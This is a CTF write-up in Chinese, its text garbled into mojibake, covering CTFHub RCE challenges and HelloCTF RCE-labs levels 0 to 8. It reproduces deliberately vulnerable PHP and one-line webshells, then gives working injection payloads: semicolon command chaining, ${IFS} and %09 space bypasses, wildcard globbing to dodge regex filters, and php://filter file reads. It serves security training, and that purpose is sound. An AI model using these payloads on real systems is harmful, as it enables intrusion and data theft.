# CTFHub-RCE æ¨¡å—

## eval()æ‰§è¡Œ
```php
 <?php
if (isset($_REQUEST['cmd'])) {
    eval($_REQUEST["cmd"]);
} else {
    highlight_file(__FILE__);
}
?> 
```

> âœ¨ æ²¡å•¥è¿‡æ»¤çš„
>

```php
/?cmd=system("ls /");
/?cmd=system("cat /flag_17544");
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736913432352-9edbc657-2220-481e-bc30-59df66ecfbeb.png)

## æ–‡ä»¶åŒ…å«
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736913515373-1e665137-9a58-4816-9a0b-6ccbae812ea7.png)

> ä¸Šè¿°ä»£ç è¿‡æ»¤äº† flag
>

ç‚¹å¼€ shell å¾—åˆ°äº†ä¸€ç‚¹ä¿¡æ¯

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736913555987-bef278f1-1ac4-49d6-a2d7-144b30adfd51.png)

> âœ¨
>
> ä½¿ç”¨ shell.txt çš„å†…å®¹æ˜¯ä¸€å¥è¯æœ¨é©¬
>
> å¯ä»¥ä½¿ç”¨ file ä¼ å‚ shell.txt äº§ç”Ÿæ³¨å…¥ç‚¹
>

```php
/?file=shell.txt&ctfhub=system("ls /");
/?file=shell.txt&ctfhub=system("cat /flag");
```

> ä¹Ÿå¯ä»¥ç”¨èšå‰‘è¿æ¥
>

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736913960316-713cb74b-8da2-4bb5-86ee-c74cc95a1ded.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736914004963-8b19af2f-15af-479f-a0f8-268a8e6ae261.png)

##  php://input
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736918697555-3d8c07b7-d2ed-49b8-ae0a-a7e06d59e375.png)

> ![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736918749759-7464f4c3-fb7c-48f9-b672-7eb894283e5e.png)
>

åœ¨ phpinfo é‡Œå¯ä»¥çœ‹åˆ°ä½¿ç”¨æ¡ä»¶å·²ç»å…·å¤‡

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736918807858-52ff7c36-4d67-40bb-ac81-0b3b20299d09.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736919175189-2f259a7b-dd9c-4fe2-8a2f-70e82c5f1c1f.png)![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736919204782-e14ed755-31be-4589-9ec5-29a24ebc5120.png)

## è¯»å–æºä»£ç 
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736919739560-c05c0e2e-4f79-42bc-8599-747bcb75c6d5.png)

> ![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736918749759-7464f4c3-fb7c-48f9-b672-7eb894283e5e.png?x-oss-process=image%2Fformat%2Cwebp)
>

ä½¿ç”¨ php://filter è¯»å–æ–‡ä»¶

```php
/?file=php://filter/resource=/flag
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736919973171-9d816437-4426-4f54-88aa-4dea7432ae69.png)

## è¿œç¨‹åŒ…å«
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736920027838-f49bf204-7f33-4c7c-81b0-503053ff6516.png)

å’Œ php://input åŒè§£

## å‘½ä»¤æ³¨å…¥
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736923914149-dd666dc5-d3bb-496f-a18b-de132c542f21.png)

çœ‹åˆ°æºç 

> å¤šå‘½ä»¤æ‰§è¡Œï¼Œç›´æ¥ç”¨åˆ†å·æˆªæ–­
>

```php
;ls
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736925002791-3477ec7e-3cad-486e-a610-ae637e4a3e6e.png)

å› ä¸º php æ— æ³•ç›´æ¥åœ¨ç½‘é¡µä¸­æ˜¾ç¤ºæ‰€ä»¥è¦ç¼–ç 

```php
;ls ;cat 2404596998962.php | base64
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736925126058-c6ba71c4-fb7d-4fd7-94a1-f35d2abb46e6.png)

è§£ç 

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736925183830-39e0ea4b-82b5-4208-8767-2c4a030e26d6.png)

## è¿‡æ»¤ cat
```php
;ls
;tac flag_57202333513255.php | base64
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736925503731-02ba4ca5-2949-433c-a897-60df69cc701e.png)

è§£ç 

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736925531890-5ad1440a-4dd3-43d8-818b-96177b90a3cf.png)

## è¿‡æ»¤ç©ºæ ¼
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736929430239-d00afe8a-17b3-46f3-ada0-ab41616fd366.png)

```php
;ls
;cat${IFS}flag_320502311823104.php${IFS}|${IFS}base64
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736929532336-34e392fe-e4ba-4bbd-a740-b428c1611200.png)

è§£ç 

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736929997953-7a0cab5c-94c3-4a24-b99f-1e0139df7758.png)

##  è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦  
> ä½¿ç”¨ cd å‘½ä»¤
>

```php
;ls
;cd flag_is_here;ls
;cd flag_is_here;cat flag_87731798816231.php | base64
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736929800343-c568cc78-0aa8-4105-9e29-8995bc0f9f4c.png)

è§£ç 

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736929822273-eaf1a1bc-64b2-4f19-9df4-c29c76ee0db2.png)

## è¿‡æ»¤è¿ç®—ç¬¦
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736930078528-6718edc5-f172-43f9-a976-bf71f48602b0.png)

> è¿‡æ»¤äº† | å’Œ &
>

```php
;ls
;cat flag_12652570514870.php
//å³é”®çœ‹æºç å³å¯å¾—åˆ°flag
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736930641529-a3329b8b-4428-45fb-b08b-5baf95cd542d.png)

## ç»¼åˆç»ƒä¹ 
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736930771508-b3608053-7eaa-4ed5-a829-5f31d0ce6b5c.png)

> è¿‡æ»¤äº† |  &  ï¼›ç©ºæ ¼   /   cat  flag  ctfhub
>

> ;  ç”¨  %0a æ›¿ä»£ï¼ˆå‘½ä»¤åˆ†éš”ç¬¦ï¼‰
>
> ç©ºæ ¼ç”¨ %09 æ›¿ä»£
>
> flag  ç”¨  f* æ›¿ä»£
>

åœ¨ url æ ä¸­è¾“å…¥

```php
/?ip=%0Als
/?ip=%0Als%09f*
/?ip=%0Acd%09f*%0Atac%09f*
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737291819291-756c2694-8f01-4de6-a8cf-2befd2134c15.png)

# RCE-labs
## Level 0  ä»£ç æ‰§è¡Œ&å‘½ä»¤æ‰§è¡Œ  
> flag ï¼Œç‚¹å‡»å°±é€
>

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737266652636-70993043-7e02-4fd2-ae56-969296d86133.png)

## Level 1  ä¸€å¥è¯æœ¨é©¬å’Œä»£ç æ‰§è¡Œ  
```php
<?php 
  include ("get_flag.php");
/*
# -*- coding: utf-8 -*-
# @Author: æ¢å§¬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCEé¶åœº : ä¸€å¥è¯æœ¨é©¬å’Œä»£ç æ‰§è¡Œ --- 

ã€Œä»£ç æ‰§è¡Œ(Code Execution)ã€ åœ¨æŸä¸ªè¯­è¨€ä¸­ï¼Œé€šè¿‡ä¸€äº›æ–¹å¼(é€šå¸¸ä¸ºå‡½æ•°æˆ–è€…æ–¹æ³•è°ƒç”¨)æ‰§è¡Œè¯¥è¯­è¨€çš„ä»»æ„ä»£ç çš„è¡Œä¸ºï¼Œå¦‚PHPä¸­çš„`eval()`å‡½æ•°æˆ–Pythonä¸­çš„`exec()`å‡½æ•°ã€‚

å½“æ¼æ´å…¥å£ç‚¹å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç æ—¶ï¼Œæˆ‘ä»¬ç§°å…¶ä¸ºä»£ç æ‰§è¡Œæ¼æ´ â€”â€” è¿™ç§æ¼æ´åŒ…å«äº†é€šè¿‡è¯­è¨€ä¸­å¯¹æ¥ç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æƒ…å†µï¼Œæ¯”å¦‚ eval("system('cat /etc/passwd')";); ä¹Ÿè¢«å½’ä¸ºä»£ç æ‰§è¡Œæ¼æ´ã€‚

æˆ‘ä»¬å¹³æ—¶æœ€å¸¸è§çš„ä¸€å¥è¯æœ¨é©¬å°±ç”¨çš„ eval() å‡½æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼ˆä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸ºäº†æ¥æ”¶æ›´é•¿çš„Payloadï¼Œæˆ‘ä»¬ä¸€èˆ¬å¯¹å¯æ§å‚æ•°ä½¿ç”¨POSTä¼ å‚ï¼‰

try POST:
    a=echo "Hello,World!";
*/

eval($_POST['a']);

highlight_file(__FILE__);

?>
```

> èšå‰‘è¿æ¥
>

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737266747082-68786e4d-687c-4362-9047-787fc90bc8a6.png)

## Level 2 PHPä»£ç æ‰§è¡Œå‡½æ•°  
```php
<?php 
include ("get_flag.php");
global $flag;

session_start(); // å¼€å¯ session
/*
# -*- coding: utf-8 -*-
# @Author: æ¢å§¬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCEé¶åœº : PHPä»£ç æ‰§è¡Œå‡½æ•° --- 

é™¤å¼€åœ¨ä¸€å¥è¯æœ¨é©¬ä¸­æœ€å—æ¬¢è¿ç”¨ä»¥ç›´æ¥æ‰§è¡ŒPHPä»£ç çš„ eval() å‡½æ•°ï¼ŒPHPè¿˜æœ‰è®¸å¤š å›è°ƒå‡½æ•° ä¹Ÿå¯ä»¥ç›´æ¥æˆ–è€…é—´æ¥çš„æ‰§è¡ŒPHPä»£ç ã€‚

åœ¨è¯¥å…³å¡ä¸­ï¼Œä½ å°†ä¼šä»èƒ½å¤Ÿæ‰§è¡Œä»£ç çš„PHPå‡½æ•°ä¸­æŠ½å–ä¸€ä¸ªï¼Œä½ éœ€è¦å¡«å……å‡½æ•°çš„å†…å®¹æ¥æ‰§è¡ŒæŸäº›ä»£ç ä»¥è·å–flagï¼ˆtip:flagå­˜å‚¨åœ¨ $flag ä¸­,å½“ç„¶ä½ ä¹Ÿå¯ä»¥å°è¯•å…¶ä»–æ–¹æ³•ï¼‰ã€‚


*/
function hello_ctf($function, $content){
  global $flag;
  $code = $function . "(" . $content . ");";
  echo "Your Code: $code <br>";
  eval($code);
}

function get_fun(){

  $func_list = ['eval','assert','call_user_func','create_function','array_map','call_user_func_array','usort','array_filter','array_reduce','preg_replace'];

  if (!isset($_SESSION['random_func'])) {
    $_SESSION['random_func'] = $func_list[array_rand($func_list)];
  }

  $random_func = $_SESSION['random_func'];

  $url_fucn = preg_replace('/_/', '-', $_SESSION['random_func']);

  echo "è·å¾—æ–°çš„å‡½æ•°: $random_func ï¼Œå» https://www.php.net/manual/zh/function.".$url_fucn.".php æŸ¥çœ‹å‡½æ•°è¯¦æƒ…ã€‚<br>";

  return $_SESSION['random_func'];
}

function start($act){

  $random_func = get_fun();

  if($act == "r"){ /* é€šè¿‡å‘é€GET ?action=r çš„æ–¹å¼å¯ä»¥é‡ç½®å½“å‰é€‰ä¸­çš„å‡½æ•° â€”â€” æˆ–è€…ä½ å¯ä»¥è‡ªå·±æƒ³åŠæ³•å¯æ§å®ƒx */
                   session_unset();
                   session_destroy(); 
                 }

  if ($act == "submit"){
    $user_content = $_POST['content']; 
    hello_ctf($random_func, $user_content);
  }
}

isset($_GET['action']) ? start($_GET['action']) : '';

highlight_file(__FILE__);

?>
```

> ä»£ç å®¡è®¡
>
> ä»¥ä¸‹æ˜¯å¯¹ä¸Šè¿° PHP ä»£ç çš„æ€»ç»“ï¼š
>
> 1. **æ–‡ä»¶åŒ…å«ä¸å…¨å±€å˜é‡**ï¼š
>     - `include ("get_flag.php");`ï¼šåŒ…å«äº†ä¸€ä¸ªåä¸º `get_flag.php` çš„æ–‡ä»¶ã€‚
>     - `global $flag;`ï¼šå£°æ˜ `$flag` ä¸ºå…¨å±€å˜é‡ï¼Œè¯¥å˜é‡å¯èƒ½å­˜å‚¨äº†éœ€è¦è·å–çš„ `flag`ã€‚
> 2. **Session æ“ä½œ**ï¼š
>     - `session_start();`ï¼šå¼€å¯ä¼šè¯ï¼Œç”¨äºå­˜å‚¨ç”¨æˆ·ä¼šè¯ä¿¡æ¯ã€‚
> 3. **æ ¸å¿ƒå‡½æ•° **`hello_ctf`ï¼š
>     - `function hello_ctf($function, $content){...}`ï¼š
>         * æ¥æ”¶ä¸¤ä¸ªå‚æ•° `$function` å’Œ `$content`ã€‚
>         * æ„å»ºä»£ç å­—ç¬¦ä¸² `$code`ï¼Œå°† `$function` å’Œ `$content` æ‹¼æ¥æˆå¯æ‰§è¡Œçš„ä»£ç ï¼Œæ ¼å¼ä¸º `$function($content);`ã€‚
>         * è¾“å‡ºæ„å»ºçš„ä»£ç å­—ç¬¦ä¸² `Your Code: $code <br>`ã€‚
>         * ä½¿ç”¨ `eval($code);` æ‰§è¡Œæ‹¼æ¥çš„ä»£ç ï¼Œè¿™é‡Œå­˜åœ¨ä»£ç æ‰§è¡Œé£é™©ï¼Œå› ä¸º `eval` ä¼šæ‰§è¡Œä¼ å…¥çš„å­—ç¬¦ä¸²ä½œä¸º PHP ä»£ç ã€‚
> 4. **å‡½æ•° **`get_fun`ï¼š
>     - `function get_fun(){...}`ï¼š
>         * å®šä¹‰ä¸€ä¸ªåŒ…å«å¤šä¸ª PHP å‡½æ•°åç§°çš„æ•°ç»„ `$func_list`ï¼Œè¿™äº›å‡½æ•°å¯èƒ½ä¸ä»£ç æ‰§è¡Œç›¸å…³ï¼Œä¾‹å¦‚ `eval`ã€`assert`ã€`call_user_func` ç­‰ã€‚
>         * æ£€æŸ¥ä¼šè¯ä¸­æ˜¯å¦å·²ç»å­˜å‚¨äº† `random_func`ï¼Œè‹¥æ²¡æœ‰ï¼Œåˆ™ä» `$func_list` ä¸­éšæœºé€‰æ‹©ä¸€ä¸ªå‡½æ•°å­˜å‚¨åˆ° `$_SESSION['random_func']`ã€‚
>         * è·å–å­˜å‚¨åœ¨ä¼šè¯ä¸­çš„å‡½æ•°åç§°å¹¶èµ‹å€¼ç»™ `$random_func`ã€‚
>         * å¯¹å‡½æ•°åç§°è¿›è¡Œå¤„ç†ï¼Œå°†ä¸‹åˆ’çº¿ `_` æ›¿æ¢ä¸ºè¿å­—ç¬¦ `-` å­˜å‚¨åœ¨ `$url_fucn` ä¸­ã€‚
>         * è¾“å‡ºè·å–çš„å‡½æ•°ä¿¡æ¯ï¼Œå¹¶æä¾›ä¸€ä¸ªé“¾æ¥åˆ° PHP å®˜æ–¹æ–‡æ¡£æŸ¥çœ‹è¯¥å‡½æ•°çš„è¯¦ç»†ä¿¡æ¯ã€‚
>         * æœ€ç»ˆè¿”å›å­˜å‚¨åœ¨ä¼šè¯ä¸­çš„å‡½æ•°åç§°ã€‚
> 5. **å‡½æ•° **`start`ï¼š
>     - `function start($act){...}`ï¼š
>         * è°ƒç”¨ `get_fun` å‡½æ•°è·å–ä¸€ä¸ªéšæœºå‡½æ•°å­˜å‚¨åœ¨ `$random_func` ä¸­ã€‚
>         * æ ¹æ®ä¼ å…¥çš„ `$act` å‚æ•°è¿›è¡Œä¸åŒæ“ä½œï¼š
>             + è‹¥ `$act == "r"`ï¼Œé€šè¿‡ `session_unset();` å’Œ `session_destroy();` é‡ç½®ä¼šè¯ï¼Œå¯ç”¨äºé‡ç½®å½“å‰é€‰ä¸­çš„å‡½æ•°ã€‚
>             + è‹¥ `$act == "submit"`ï¼Œä» `$_POST['content']` è·å–ç”¨æˆ·è¾“å…¥çš„å†…å®¹å­˜å‚¨åœ¨ `$user_content` ä¸­ï¼Œç„¶åè°ƒç”¨ `hello_ctf` å‡½æ•°ï¼Œå°† `$random_func` å’Œ `$user_content` ä½œä¸ºå‚æ•°ä¼ é€’ã€‚
> 6. **ç¨‹åºå…¥å£**ï¼š
>     - `isset($_GET['action'])? start($_GET['action']) : '';`ï¼šæ ¹æ® `GET` è¯·æ±‚çš„ `action` å‚æ•°æ¥è°ƒç”¨ `start` å‡½æ•°ï¼Œè‹¥ `action` å‚æ•°ä¸å­˜åœ¨ï¼Œåˆ™ä¸æ‰§è¡Œä»»ä½•æ“ä½œã€‚
> 7. **æ˜¾ç¤ºä»£ç **ï¼š
>     - `highlight_file(__FILE__);`ï¼šå°†å½“å‰æ–‡ä»¶çš„ä»£ç é«˜äº®æ˜¾ç¤ºï¼Œå¯èƒ½ç”¨äºä»£ç å®¡è®¡æˆ–è°ƒè¯•ã€‚
>

éšä¾¿è¾“å…¥ä¸€ä¸‹ï¼Œå¾—åˆ°éšæœºçš„å‡½æ•° assertï¼ˆï¼‰

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737287940489-f91579d7-db33-45a8-b632-be32b143ed0f.png)

> ç„¶å /?action=submit
>
> content=print_r($flag)
>

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737288174893-2ed5d4ca-eff2-4635-9db0-be9c45820afa.png)

## Level 3 å‘½ä»¤æ‰§è¡Œ
```php
<?php 
  /*
# -*- coding: utf-8 -*-
# @Author: æ¢å§¬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCEé¶åœº : å‘½ä»¤æ‰§è¡Œ --- 

ã€Œå‘½ä»¤æ‰§è¡Œ(Command Execution)ã€ é€šå¸¸æŒ‡çš„æ˜¯åœ¨æ“ä½œç³»ç»Ÿå±‚é¢ä¸Šæ‰§è¡Œé¢„å®šä¹‰çš„æŒ‡ä»¤æˆ–è„šæœ¬ã€‚è¿™äº›å‘½ä»¤æœ€ç»ˆçš„æŒ‡å‘é€šå¸¸æ˜¯ç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚Windowsä¸­çš„CMDå‘½ä»¤æˆ–Linuxä¸­çš„Shellå‘½ä»¤ï¼Œè¿™åœ¨è¯­è¨€ä¸­å¯ä»¥ä½“ç°ä¸ºä¸€äº›ç‰¹å®šçš„å‡½æ•°æˆ–è€…æ–¹æ³•è°ƒç”¨ï¼Œå¦‚PHPä¸­çš„`shell_exec()`å‡½æ•°æˆ–Pythonä¸­çš„`os.system()`å‡½æ•°ã€‚

å½“æ¼æ´å…¥å£ç‚¹åªèƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç§°è¯¥æ¼æ´ä¸ºå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå¦‚ä¸‹é¢ä¿®æ”¹è¿‡çš„ "ä¸€å¥è¯æœ¨é©¬":

try POST:
    a=cat /etc/passwd;

*/

system($_POST['a']);

highlight_file(__FILE__);


?>
```

```php
a=ls /
a=cat /flag
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737288431948-19a393d2-f40f-4a96-b073-4298d680e23d.png)![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737288454184-59f8a675-4c57-49a7-b3e2-5da36fb0fea1.png)

## Level 4  SHELL è¿ç®—ç¬¦  
```php
 <?php 
/*
# -*- coding: utf-8 -*-
# @Author: æ¢å§¬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCEé¶åœº : å‘½ä»¤æ‰§è¡Œ - SHELL è¿ç®—ç¬¦ --- 

https://www.runoob.com/linux/linux-shell-basic-operators.html

SHELL è¿ç®—ç¬¦ å¯ä»¥ç”¨äºæ§åˆ¶å‘½ä»¤çš„æ‰§è¡Œæµç¨‹ï¼Œä½¿å¾—ä½ èƒ½å¤Ÿæ ¹æ®æ¡ä»¶æ‰§è¡Œä¸åŒçš„å‘½ä»¤ã€‚

&&ï¼ˆé€»è¾‘ä¸è¿ç®—ç¬¦ï¼‰: åªæœ‰å½“ç¬¬ä¸€ä¸ªå‘½ä»¤ cmd_1 æ‰§è¡ŒæˆåŠŸï¼ˆè¿”å›å€¼ä¸º 0ï¼‰æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œç¬¬äºŒä¸ªå‘½ä»¤ cmd_2ã€‚ä¾‹:  mkdir test && cd test

||ï¼ˆé€»è¾‘æˆ–è¿ç®—ç¬¦ï¼‰: åªæœ‰å½“ç¬¬ä¸€ä¸ªå‘½ä»¤ cmd_1 æ‰§è¡Œå¤±è´¥ï¼ˆè¿”å›å€¼ä¸ä¸º 0ï¼‰æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œç¬¬äºŒä¸ªå‘½ä»¤ cmd_2ã€‚ä¾‹:  cd nonexistent_directory || echo "Directory not found"

&ï¼ˆåå°è¿è¡Œç¬¦ï¼‰: å°†å‘½ä»¤ cmd_1 æ”¾åˆ°åå°æ‰§è¡Œï¼ŒShell ç«‹å³æ‰§è¡Œ cmd_2ï¼Œä¸¤ä¸ªå‘½ä»¤å¹¶è¡Œæ‰§è¡Œã€‚ä¾‹:  sleep 10 & echo "This will run immediately."

;ï¼ˆå‘½ä»¤åˆ†éš”ç¬¦ï¼‰: æ— è®ºå‰ä¸€ä¸ªå‘½ä»¤ cmd_1 æ˜¯å¦æˆåŠŸï¼Œéƒ½ä¼šæ‰§è¡Œä¸‹ä¸€ä¸ªå‘½ä»¤ cmd_2ã€‚ä¾‹:  echo "Hello" ; echo "World"


try GET:
    ?ip=8.8.8.8
flag is /flag
*/

function hello_server($ip){
    system("ping -c 1 $ip");
}

isset($_GET['ip']) ? hello_server($_GET['ip']) : null;

highlight_file(__FILE__);


?>

```

åˆ†å‰²ä¸€ä¸‹ ping å‘½ä»¤å°±è¡Œ

```php
/?ip=;ls /
/?ip=;cat /flag
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737288604656-4c688163-5288-4c86-bdd0-996df1be83f8.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737288644341-58a7426f-ab03-4329-a861-b22fc922be00.png)

## Level 5  é»‘åå•å¼è¿‡æ»¤  
```php
 <?php 
/*
# -*- coding: utf-8 -*-
# @Author: æ¢å§¬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCEé¶åœº : å‘½ä»¤æ‰§è¡Œ - ç»ˆç«¯ç‰¹æ€§_ç©ºå­—ç¬¦å¿½ç•¥å’Œé€šé…ç¬¦ --- 

åœ¨Shellä¸­ï¼Œå•/åŒå¼•å· "/' å¯ä»¥ç”¨æ¥å®šä¹‰ä¸€ä¸ªç©ºå­—ç¬¦ä¸²æˆ–ä¿æŠ¤åŒ…å«ç©ºæ ¼æˆ–ç‰¹æ®Šå­—ç¬¦çš„å­—ç¬¦ä¸²ã€‚
ä¾‹å¦‚ï¼šecho "$"a ä¼šè¾“å‡º $aï¼Œè€Œ echo $a ä¼šè¾“å‡ºå˜é‡açš„å€¼ï¼Œå½“åªæœ‰""åˆ™è¡¨ç¤ºç©ºå­—ç¬¦ä¸²ï¼ŒShellä¼šå¿½ç•¥å®ƒã€‚

*ï¼ˆæ˜Ÿå·ï¼‰: åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚ä¾‹å­: *.txtã€‚
?ï¼ˆé—®å·ï¼‰: åŒ¹é…å•ä¸ªå­—ç¬¦ã€‚ä¾‹å­: file?.txtã€‚
[]ï¼ˆæ–¹æ‹¬å·ï¼‰: åŒ¹é…æ–¹æ‹¬å·å†…çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ä¾‹å­: file[1-3].txtã€‚
[^]ï¼ˆå–åæ–¹æ‹¬å·ï¼‰: åŒ¹é…ä¸åœ¨æ–¹æ‹¬å·å†…çš„å­—ç¬¦ã€‚ä¾‹å­: file[^a-c].txtã€‚
{}ï¼ˆå¤§æ‹¬å·ï¼‰: åŒ¹é…å¤§æ‹¬å·å†…çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ä¾‹å­: file{1,2,3}.txtã€‚

é€šè¿‡ç»„åˆä¸Šè¿°æŠ€å·§ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨äºç»•è¿‡CTFä¸­ä¸€äº›ç®€å•çš„è¿‡æ»¤ï¼š

system("c''at /e't'c/pass?d");
system("/???/?at /e't'c/pass?d");
system("/???/?at /e't'c/*ss*");
...


*/

function hello_shell($cmd){
    if(preg_match("/flag/", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>

```

```php
/?cmd=ls /
/?cmd=cat /fla?
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737289103357-41b2076c-374a-44b8-aef1-344dbf232ae3.png)![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737289138644-593bfeef-abee-4cd7-b5a1-0efc55442384.png)

## Level 6  é€šé…ç¬¦åŒ¹é…ç»•è¿‡  
```php
 <?php 
/*
# -*- coding: utf-8 -*-
# @Author: æ¢å§¬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCEé¶åœº : æŒ‘æˆ˜å…³ --- 

åˆšæ‰ï¼Œå­¦äº†ä»€ä¹ˆæ¥ç€ï¼ï¼Ÿ

*/

function hello_shell($cmd){
    if(preg_match("/[b-zA-Z_@#%^&*:{}\-\+<>\"|`;\[\]]/", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>
```

> ç¦ç”¨äº†å°å†™ b åˆ° zï¼Œå¤§å†™ A åˆ° Zï¼Œ_  @  # % ^  &  *  :  {  }  -  +  <  >  "  |   '  ;  [  ]  
>

æ³¨æ„æ²¡æœ‰ç¦ç”¨å°å†™ a

çŒœæµ‹ flag åœ¨æ ¹ç›®å½•ä¸‹

åŒæ—¶äº† linux å‘½ä»¤éƒ½æ”¾åœ¨ bin ç›®å½•ä¸‹

å¯ä»¥æ„é€ 

> /bin/cat  /flag
>
> /bin/base64 /flag
>

æ¨¡ç³ŠåŒ¹é…ä¸€ä¸‹ï¼Œå¦‚ä¸‹

```php
/?cmd=/???/?a? /??a?
/?cmd=/???/?a??64 /??a?
```

ä¼šåŒ¹é…åˆ°å¾ˆå¤šä¸œè¥¿ï¼Œæœç´¢ä¸€ä¸‹å°±å¥½äº†

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737289864293-5276f36b-e432-45e3-9069-077938dbe31d.png)

## Level 7  ç©ºæ ¼è¿‡æ»¤  
```php
 <?php 
/*
# -*- coding: utf-8 -*-
# @Author: æ¢å§¬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCEé¶åœº : å‘½ä»¤æ‰§è¡Œ - ç»ˆç«¯ç‰¹æ®Šå­—ç¬¦ --- 

åœ¨é‡åˆ°ç©ºæ ¼è¢«è¿‡æ»¤çš„æƒ…å†µä¸‹ï¼Œé€šå¸¸ä½¿ç”¨ %09 ä¹Ÿå°±æ˜¯TABçš„URLç¼–ç æ¥ç»•è¿‡ï¼Œåœ¨ç»ˆç«¯ç¯å¢ƒä¸‹ ç©ºæ ¼ è¢«è§†ä¸ºä¸€ä¸ªå‘½ä»¤åˆ†éš”ç¬¦ï¼Œæœ¬è´¨ä¸Šç”± $IFS å˜é‡æ§åˆ¶ï¼Œè€Œ $IFS çš„é»˜è®¤å€¼æ˜¯ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦å’Œæ¢è¡Œç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ç›´æ¥é”®å…¥ $IFS æ¥ç»•è¿‡ç©ºæ ¼è¿‡æ»¤ã€‚


*/

function hello_shell($cmd){
    if(preg_match("/flag| /", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>

```

> è¿‡æ»¤äº†ç©ºæ ¼å’Œ flag
>

```php
/?cmd=ls /
cat$IFS/fla*
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737290327284-4b3adb0b-ba59-4eb8-acdc-bccc4f4c31f9.png)

## Level 8  æ–‡ä»¶æè¿°å’Œé‡å®šå‘
```php
 <?php 
/*
# -*- coding: utf-8 -*-
# @Author: æ¢å§¬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCEé¶åœº : å‘½ä»¤æ‰§è¡Œ - é‡å®šå‘ --- 

